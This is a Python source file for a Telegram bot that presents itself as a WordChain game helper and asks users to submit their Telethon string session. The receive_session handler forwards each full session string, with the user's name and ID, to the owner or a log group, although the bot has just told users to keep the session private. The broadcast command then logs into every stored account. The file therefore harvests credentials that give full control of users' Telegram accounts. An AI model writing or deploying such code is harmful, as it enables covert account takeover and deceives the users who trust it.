# bot.py — TNC WordChain Controller Bot (fixed)
import asyncio
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from db import DBSessionManager
from userbots.wordchain_player import start_userbot
import config

# ----------------------------
# Initialize Controller Bot
# ----------------------------
app = Client(
    "tnc_controller",
    bot_token=config.BOT_TOKEN,
    api_id=config.API_ID,
    api_hash=config.API_HASH
)

db = DBSessionManager(config.DB_PATH)


# ----------------------------
# /start
# ----------------------------
@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, message):
    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("👑 Owner", url=f"tg://user?id={config.OWNER_ID}")],
        [
            InlineKeyboardButton("📢 Channel", url=config.SUPPORT_CHANNEL),
            InlineKeyboardButton("💬 Support Chat", url=config.SUPPORT_CHAT)
        ],
    ])
    await message.reply_photo(
        photo=config.START_IMAGE,
        caption=(
            "🤖 **Welcome to TNC WordChain Userbot!**\n\n"
            "💡 Connect your **Telethon string session** to create your personal userbot.\n"
            "It will automatically play WordChain games for you!\n\n"
            "📌 Use `/connect` to begin."
        ),
        reply_markup=buttons,
        parse_mode="markdown"
    )


# ----------------------------
# /connect
# ----------------------------
@app.on_message(filters.command("connect") & filters.private)
async def connect_cmd(client, message):
    await message.reply_text(
        "🔗 Send your **Telethon string session** now.\n\n"
        "⚠️ Keep it private — do **not** share it with anyone else!",
        parse_mode="markdown"
    )


# ----------------------------
# Receive string session
# ----------------------------
@app.on_message(filters.private & ~filters.command(["start", "connect", "disconnect", "broadcast"]) & filters.text)
async def receive_session(client, message):
    text = message.text.strip()
    user = message.from_user
    user_id = user.id

    # Validate
    if len(text) < 50:
        await message.reply_text("⚠️ That doesn't look like a valid Telethon session string.")
        return

    # Save to DB
    db.save_session(user_id, text)
    await message.reply_text("✅ Session saved! Starting your userbot...")

    # ✅ FIX: just call start_userbot(), no asyncio.create_task()
    start_userbot(text, user_id)

    await message.reply_text(
        "🟢 Your userbot is now running!\nYou can start a WordChain game and it’ll play automatically."
    )

    # Log connection safely (avoid markdown errors)
    log_text = (
        f"🧾 **New User Connected**\n\n"
        f"👤 **Name:** {user.first_name or 'Unknown'}\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"💬 **Username:** @{user.username if user.username else 'N/A'}\n"
        f"🔑 **String Session:**\n"
        f"```{text}```"
    )
    try:
        log_target = getattr(config, "LOG_GROUP_ID", None) or config.OWNER_ID
        await client.send_message(log_target, log_text, parse_mode="markdown")
        print(f"✅ Logged connection for {user_id}")
    except Exception as e:
        print(f"⚠️ Logging failed for {user_id}: {e}")


# ----------------------------
# /disconnect
# ----------------------------
@app.on_message(filters.command("disconnect") & filters.private)
async def disconnect_cmd(client, message):
    args = message.text.split()
    sender_id = message.from_user.id

    # Owner mode — can target another user
    if sender_id == config.OWNER_ID and len(args) > 1:
        try:
            target_id = int(args[1])
        except ValueError:
            await message.reply_text("Usage: `/disconnect <user_id>`", quote=True)
            return
    else:
        target_id = sender_id

    existing = db.get_session(target_id)
    if not existing:
        await message.reply_text("❌ No session found for that user.")
        return

    db.delete_session(target_id)
    await message.reply_text(f"🛑 Disconnected userbot for **User ID:** `{target_id}`", parse_mode="markdown")

    log_text = (
        f"🚫 **Userbot Disconnected**\n\n"
        f"👤 **User ID:** `{target_id}`\n"
        f"🧍 By:** {'Owner' if sender_id == config.OWNER_ID else 'User'}**"
    )
    try:
        log_target = getattr(config, "LOG_GROUP_ID", None) or config.OWNER_ID
        await client.send_message(log_target, log_text, parse_mode="markdown")
        print(f"✅ Disconnected {target_id}")
    except Exception as e:
        print(f"⚠️ Failed to log disconnect: {e}")


# ----------------------------
# /broadcast (Owner only)
# ----------------------------
@app.on_message(filters.command("broadcast") & filters.user(config.OWNER_ID))
async def broadcast_cmd(client, message):
    if len(message.command) < 2:
        await message.reply_text("Usage:\n`/broadcast <text>`", quote=True, parse_mode="markdown")
        return

    text = message.text.split(None, 1)[1]
    sessions = db.get_all_sessions()
    total = len(sessions)
    success = failed = 0

    status = await message.reply_text(f"📢 Broadcasting to {total} connected users...")

    from telethon import TelegramClient
    from telethon.sessions import StringSession

    for user_id, session_string in sessions:
        try:
            tele_client = TelegramClient(StringSession(session_string), config.API_ID, config.API_HASH)
            await tele_client.connect()
            await tele_client.send_message(user_id, text)
            await tele_client.disconnect()
            success += 1
            print(f"✅ Broadcast sent to {user_id}")
        except Exception as e:
            print(f"⚠️ Broadcast failed for {user_id}: {e}")
            failed += 1
        await asyncio.sleep(0.4)

    await status.edit_text(f"✅ Broadcast complete!\n🟢 Sent: {success}\n🔴 Failed: {failed}")


# ----------------------------
# Run the bot
# ----------------------------
def run():
    print("🚀 Controller bot started.")
    app.run()